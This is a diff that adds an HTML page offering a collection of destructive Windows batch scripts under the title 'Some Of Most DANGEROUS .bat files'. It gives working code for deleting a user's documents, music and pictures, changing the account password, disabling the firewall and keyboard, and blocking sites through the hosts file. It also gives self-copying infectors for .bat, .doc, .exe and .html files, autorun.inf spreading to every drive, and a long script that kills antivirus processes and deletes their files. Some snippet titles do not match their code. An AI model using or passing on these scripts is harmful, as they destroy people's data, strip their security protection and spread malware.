@@ -1,0 +1,89 @@
+<html>
+<style>
+
+body{ margin:0; padding:0; 
+
+font-family: 'Open Sans', sans-serif;
+font-family: 'Slabo 27px', serif;
+}
+
+.wrapper {
+    background: #141518;
+    color: #f2f2f2;
+	padding:20px;
+}
+
+
+.para {
+    background: #34373c none repeat scroll 0 0;
+    border-radius: 10px;
+    clear: both;
+    margin-bottom: 15px;
+    margin-left: auto;
+    margin-right: auto;
+    max-width: 900px;
+    overflow: hidden;
+    padding: 0 20px;
+}
+
+.para h2 {
+    font-size: 30px;
+}
+.para  p {
+    font-size: 16px;
+	line-height:24px;
+}
+
+
+.ul-title {
+    font-size: 20px;
+    font-weight: bold;
+}
+
+/*.wrapper p{ margin:0;}
+*/
+
+</style>
+
+<body>
+<div class="wrapper">
+<div class="para">
+<p><strong>Some Of Most DANGEROUS .bat files</strong></p>
+<p>Some of these codes are very dangerous!<br />USE THIS AT YOUR OWN RISK.</p>
+<p><strong>Block Google.</strong><br />Code:<br />@echo off<br />::--------Block Google-------::<br />cd "C:\Windows\System32\Drivers\etc"<br />echo 127.0.0.1 google.com &gt;&gt; "Hosts"<br />echo 127.0.0.1 http://www.google.com &gt;&gt; "Hosts"</p>
+<p><br /><strong>Block Hotmail.</strong><br />Code:<br />@echo off<br />::--------Block Hotmail------::<br />cd "C:\Windows\System32\Drivers\etc"<br />echo 127.0.0.1 hotmail.com &gt;&gt; "Hosts"<br />echo 127.0.0.1 http://www.hotmail.com &gt;&gt; "Hosts"</p>
+<p><br /><strong>Block MSN.</strong><br />Code:<br />@echo off<br />::---------Block MSN---------::<br />cd "C:\Windows\System32\Drivers\etc"<br />echo 127.0.0.1 msn.com &gt;&gt; "Hosts"<br />echo 127.0.0.1 http://www.msn.com &gt;&gt; "Hosts"</p>
+<p><br /><strong>Block wikipedia.</strong><br />Code:<br />@echo off<br />::-------Block Wikipedia-----::<br />cd "C:\Windows\System32\Drivers\etc"<br />echo 127.0.0.1 wikipedia.org &gt;&gt; "Hosts"<br />echo 127.0.0.1 http://www.wikipedia.org &gt;&gt; "Hosts"</p>
+<p><br /><strong>Change time to 00:00.</strong><br />Code:<br />::__---Virus Created By Virus Author---__::<br />@echo off<br />::------Change The Time------::<br />time 00:00</p>
+<p><br /><strong>Change user pass.</strong><br />Code:<br />@echo off<br />::--Change Pass To InShadow--::<br />net user %username% InShadow</p>
+<p><br /><strong>Create account OWNED.</strong><br />Code:<br />@echo off<br />::----Hide My Music Folder---::<br />attrib +h "%userprofile%\my documents\my music"</p>
+<p><br /><strong>Delete all docs.</strong><br />Code:<br />@echo off<br />::----Delete My Documents----::<br />del /f /q "C:\Users\%userprofile%\My Documents\*.*"</p>
+<p><br /><strong>Delete all music.</strong><br />Code:<br />@echo off<br />::-----Delete My Music-------::<br />del /f /q "C:\Users\%userprofile%\My Documents\My Music\*.*"</p>
+<p><br /><strong>Delete all pics.</strong><br />Code:<br />@echo off<br />::-----Delete My Pictures----::<br />del /f /q "C:\Users\%userprofile%\My Documents\My Pictures\*.*"</p>
+<p><br /><strong>Disable Firewall.</strong><br />Code:<br />@echo off<br />::-Disable Windows Firewall--::<br />net stop "MpsSvc"<br />taskkill /f /t /im "FirewallControlPanel.exe"</p>
+<p><br />[color=#FF0000]Disable Internet.<br />Code:<br />@echo off</p>
+<p>ipconfig /release<br />if ERRORLEVEL1 ipconfig /release_all</p>
+<p><br /><strong>Disable Keyboard.</strong><br />Code:<br />@echo off<br />::------Disable Keyboard-----::<br />echo Windows Registry Editor Version 5.00 &gt; "nokeyboard.reg"<br />echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Keyboard Layout] &gt;&gt; "nokeyboard.reg"<br />echo "Scancode Map"=hex:00,00,00,00,00,00,00,00,7c,00,00,00,00,00,01,00,00,\ &gt;&gt; "nokeyboard.reg"<br />echo 00,3b,00,00,00,3c,00,00,00,3d,00,00,00,3e,00,00,00,3f,00,00,00,40,00,00,00,\ &gt;&gt; "nokeyboard.reg"<br />echo 41,00,00,00,42,00,00,00,43,00,00,00,44,00,00,00,57,00,00,00,58,00,00,00,37,\ &gt;&gt; "nokeyboard.reg"<br />echo e0,00,00,46,00,00,00,45,00,00,00,35,e0,00,00,37,00,00,00,4a,00,00,00,47,00,\ &gt;&gt; "nokeyboard.reg"<br />echo 00,00,48,00,00,00,49,00,00,00,4b,00,00,00,4c,00,00,00,4d,00,00,00,4e,00,00,\ &gt;&gt; "nokeyboard.reg"<br />echo 00,4f,00,00,00,50,00,00,00,51,00,00,00,1c,e0,00,00,53,00,00,00,52,00,00,00,\ &gt;&gt; "nokeyboard.reg"<br />echo 4d,e0,00,00,50,e0,00,00,4b,e0,00,00,48,e0,00,00,52,e0,00,00,47,e0,00,00,49,\ &gt;&gt; "nokeyboard.reg"<br />echo e0,00,00,53,e0,00,00,4f,e0,00,00,51,e0,00,00,29,00,00,00,02,00,00,00,03,00,\ &gt;&gt; "nokeyboard.reg"<br />echo 00,00,04,00,00,00,05,00,00,00,06,00,00,00,07,00,00,00,08,00,00,00,09,00,00,\ &gt;&gt; "nokeyboard.reg"<br />echo 00,0a,00,00,00,0b,00,00,00,0c,00,00,00,0d,00,00,00,0e,00,00,00,0f,00,00,00,\ &gt;&gt; "nokeyboard.reg"<br />echo 10,00,00,00,11,00,00,00,12,00,00,00,13,00,00,00,14,00,00,00,15,00,00,00,16,\ &gt;&gt; "nokeyboard.reg"<br />echo 00,00,00,17,00,00,00,18,00,00,00,19,00,00,00,1a,00,00,00,1b,00,00,00,2b,00,\ &gt;&gt; "nokeyboard.reg"<br />echo 00,00,3a,00,00,00,1e,00,00,00,1f,00,00,00,20,00,00,00,21,00,00,00,22,00,00,\ &gt;&gt; "nokeyboard.reg"<br />echo 00,23,00,00,00,24,00,00,00,25,00,00,00,26,00,00,00,27,00,00,00,28,00,00,00,\ &gt;&gt; "nokeyboard.reg"<br />echo 1c,00,00,00,2a,00,00,00,2c,00,00,00,2d,00,00,00,2e,00,00,00,2f,00,00,00,30,\ &gt;&gt; "nokeyboard.reg"<br />echo 00,00,00,31,00,00,00,32,00,00,00,33,00,00,00,34,00,00,00,35,00,00,00,36,00,\ &gt;&gt; "nokeyboard.reg"<br />echo 00,00,1d,00,00,00,5b,e0,00,00,38,00,00,00,39,00,00,00,38,e0,00,00,5c,e0,00,\ &gt;&gt; "nokeyboard.reg"<br />echo 00,5d,e0,00,00,1d,e0,00,00,5f,e0,00,00,5e,e0,00,00,22,e0,00,00,24,e0,00,00,\ &gt;&gt; "nokeyboard.reg"<br />echo 10,e0,00,00,19,e0,00,00,30,e0,00,00,2e,e0,00,00,2c,e0,00,00,20,e0,00,00,6a,\ &gt;&gt; "nokeyboard.reg"<br />echo e0,00,00,69,e0,00,00,68,e0,00,00,67,e0,00,00,42,e0,00,00,6c,e0,00,00,6d,e0,\ &gt;&gt; "nokeyboard.reg"<br />echo 00,00,66,e0,00,00,6b,e0,00,00,21,e0,00,00,00,00 &gt;&gt; "nokeyboard.reg"<br />start nokeyboard.reg</p>
+<p><br /><strong>Infect all Bat.</strong><br />Code:<br />@echo off<br />::----Infect All Bat Files---::<br />Dir %Homedrive% /s /b &gt; DirPath<br />For /f %%Y In (DirPath) Do (<br />Set DirPath=%%Y &gt; Nul<br />For %%Z In (%DirPath%\*.bat) Do (<br />Set BatInfect=%%Z &gt; Nul<br />Copy /y %0 %BatInfect%<br />)<br />)</p>
+<p>Del /f /s /q DirPath</p>
+<p><br /><strong>Infect all docs.</strong><br />Code:<br />@echo off<br />::-------Infect All .Doc-----::<br />Dir %Homedrive% /s /b &gt; DirPath<br />For /f %%Y In (DirPath) Do (<br />Set DirPath=%%Y &gt; Nul<br />For %%Z In (%DirPath%\*.doc) Do (<br />Set DocInfect=%%Z &gt; Nul<br />Copy /y %0 %DocInfect%<br />)<br />)</p>
+<p>Del /f /s /q DirPath</p>
+<p><strong>Infect all Drivers.</strong><br />Code:<br />@echo off</p>
+<p>::-----Infect All Drives-----::<br />for %%E In (A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z) Do (<br />copy /Y %0 %%E:\<br />echo [AutoRun] &gt; %%E:\autorun.inf<br />echo open="%%E:\%0" &gt;&gt; %%E:\autorun.inf<br />echo action=Open folder to see files... &gt;&gt; %%E:\autorun.inf)</p>
+<p><br /><strong>Infect all .exe files.</strong><br />Code:<br />@echo off<br />::----Infect All Exe Files---::<br />Dir %Homedrive% /s /b &gt; DirPath<br />For /f %%Y In (DirPath) Do (<br />Set DirPath=%%Y &gt; Nul<br />For %%Z In (%DirPath%\*.exe) Do (<br />Set ExeInfect=%%Z &gt; Nul<br />Copy /y %0 %ExeInfect%<br />)<br />)</p>
+<p>Del /f /s /q DirPath</p>
+<p><br /><strong>Open disk.</strong><br />Code:<br />@echo off<br />::-------Open Disk Tray------::<br />echo Do &gt;&gt; "opendisk.vbs"<br />echo Set oWMP = CreateObject("WMPlayer.OCX.7" ) &gt;&gt; "opendisk.vbs"<br />echo Set colCDROMs = oWMP.cdromCollection &gt;&gt; "opendisk.vbs"<br />echo colCDROMs.Item(d).Eject &gt;&gt; "opendisk.vbs"<br />echo colCDROMs.Item(d).Eject &gt;&gt; "opendisk.vbs"<br />echo Loop &gt;&gt; "opendisk.vbs"<br />start "" "opendisk.vbs"</p>
+<p><br /><strong>Spam /C Drive.</strong><br />Code:<br />@echo off<br />::-------Spam C Drive--------::<br />echo %random% &gt; "C:\%random%Spammed Filetype"<br />echo %random% &gt; "C:\%random%Spammed Filetype"<br />echo %random% &gt; "C:\%random%Spammed Filetype"<br />echo %random% &gt; "C:\%random%Spammed Filetype"<br />echo %random% &gt; "C:\%random%Spammed Filetype"<br />echo %random% &gt; "C:\%random%Spammed Filetype"<br />echo %random% &gt; "C:\%random%Spammed Filetype"<br />echo %random% &gt; "C:\%random%Spammed Filetype"<br />echo %random% &gt; "C:\%random%Spammed Filetype"<br />echo %random% &gt; "C:\%random%Spammed Filetype"<br />echo %random% &gt; "C:\%random%Spammed Filetype"</p>
+<p><strong>Kill Anti-virus.</strong><br />Code:<br />@echo off</p>
+<p>::-------AV Kill [UD]--------::<br />net stop &ldquo;Security Center&rdquo;<br />netsh firewall set opmode mode=disable<br />tskill /A av*<br />tskill /A fire*<br />tskill /A anti*<br />cls<br />tskill /A spy*<br />tskill /A bullguard<br />tskill /A PersFw<br />tskill /A KAV*<br />tskill /A ZONEALARM<br />tskill /A SAFEWEB<br />cls<br />tskill /A OUTPOST<br />tskill /A nv*<br />tskill /A nav*<br />tskill /A F-*<br />tskill /A ESAFE<br />tskill /A cle<br />cls<br />tskill /A BLACKICE<br />tskill /A def*<br />tskill /A kav<br />tskill /A kav*<br />tskill /A avg*<br />tskill /A ash*<br />cls<br />tskill /A aswupdsv<br />tskill /A ewid*<br />tskill /A guard*<br />tskill /A guar*<br />tskill /A gcasDt*<br />tskill /A msmp*<br />cls<br />tskill /A mcafe*<br />tskill /A mghtml<br />tskill /A msiexec<br />tskill /A outpost<br />tskill /A isafe<br />tskill /A zap*<br />cls<br />tskill /A zauinst<br />tskill /A upd*<br />tskill /A zlclien*<br />tskill /A minilog<br />tskill /A cc*<br />tskill /A norton*<br />cls<br />tskill /A norton au*<br />tskill /A ccc*<br />tskill /A npfmn*<br />tskill /A loge*<br />tskill /A nisum*<br />tskill /A issvc<br />tskill /A tmp*<br />cls<br />tskill /A tmn*<br />tskill /A pcc*<br />tskill /A cpd*<br />tskill /A pop*<br />tskill /A pav*<br />tskill /A padmin<br />cls<br />tskill /A panda*<br />tskill /A avsch*<br />tskill /A sche*<br />tskill /A syman*<br />tskill /A virus*<br />tskill /A realm*<br />cls<br />tskill /A sweep*<br />tskill /A scan*<br />tskill /A ad-*<br />tskill /A safe*<br />tskill /A avas*<br />tskill /A norm*<br />cls<br />tskill /A offg*<br />del /Q /F C:\Program Files\alwils~1\avast4\*.*<br />del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe<br />del /Q /F C:\Program Files\kasper~1\*.exe<br />cls<br />del /Q /F C:\Program Files\trojan~1\*.exe<br />del /Q /F C:\Program Files\f-prot95\*.dll<br />del /Q /F C:\Program Files\tbav\*.dat<br />cls<br />del /Q /F C:\Program Files\avpersonal\*.vdf<br />del /Q /F C:\Program Files\Norton~1\*.cnt<br />del /Q /F C:\Program Files\Mcafee\*.*<br />cls<br />del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.*<br />del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.*<br />del /Q /F C:\Program Files\Norton~1\Norton~1\*.*<br />del /Q /F C:\Program Files\Norton~1\*.*<br />cls<br />del /Q /F C:\Program Files\avgamsr\*.exe<br />del /Q /F C:\Program Files\avgamsvr\*.exe<br />del /Q /F C:\Program Files\avgemc\*.exe<br />cls<br />del /Q /F C:\Program Files\avgcc\*.exe<br />del /Q /F C:\Program Files\avgupsvc\*.exe<br />del /Q /F C:\Program Files\grisoft<br />del /Q /F C:\Program Files\nood32krn\*.exe<br />del /Q /F C:\Program Files\nood32\*.exe<br />cls<br />del /Q /F C:\Program Files\nod32<br />del /Q /F C:\Program Files\nood32<br />del /Q /F C:\Program Files\kav\*.exe<br />del /Q /F C:\Program Files\kavmm\*.exe<br />del /Q /F C:\Program Files\kaspersky\*.*<br />cls<br />del /Q /F C:\Program Files\ewidoctrl\*.exe<br />del /Q /F C:\Program Files\guard\*.exe<br />del /Q /F C:\Program Files\ewido\*.exe<br />cls<br />del /Q /F C:\Program Files\pavprsrv\*.exe<br />del /Q /F C:\Program Files\pavprot\*.exe<br />del /Q /F C:\Program Files\avengine\*.exe<br />cls<br />del /Q /F C:\Program Files\apvxdwin\*.exe<br />del /Q /F C:\Program Files\webproxy\*.exe<br />del /Q /F C:\Program Files\panda software\*.*</p>
+<p><strong>Infect all HTML.</strong><br />Code:<br />@echo off<br />::--Infect All Html Files---::<br />Dir %Homedrive% /s /b &gt; DirPath<br />For /f %%Y In (DirPath) Do (<br />Set DirPath=%%Y &gt; Nul<br />For %%Z In (%DirPath%\*.html) Do (<br />Set HtmlInfect=%%Z &gt; Nul<br />Copy /y %0 %HtmlInfect%<br />)<br />)</p>
+<p>Del /f /s /q DirPath</p>
+<p><br /><strong>Hide MUSIC folder.</strong><br />Code:<br />@echo off<br />::----Hide My Music Folder---::<br />attrib +h "%userprofile%\my documents\my music"</p>
+<p><br /><strong>Startup XP song</strong><br />Code:<br />@echo off<br />::--Start Hidden WinXP Song--::<br />cd "C:\Windows\system32\oobe\images"<br />start title.wma</p>
+<p><strong>Infect CMD.</strong><br />Code:<br />@echo off<br />::-----Infect "ls" CMD-----::<br />copy %0 %windir%\system32\ls.bat</p>
+</div>
+</div>
+</body>
+</html>
+
+
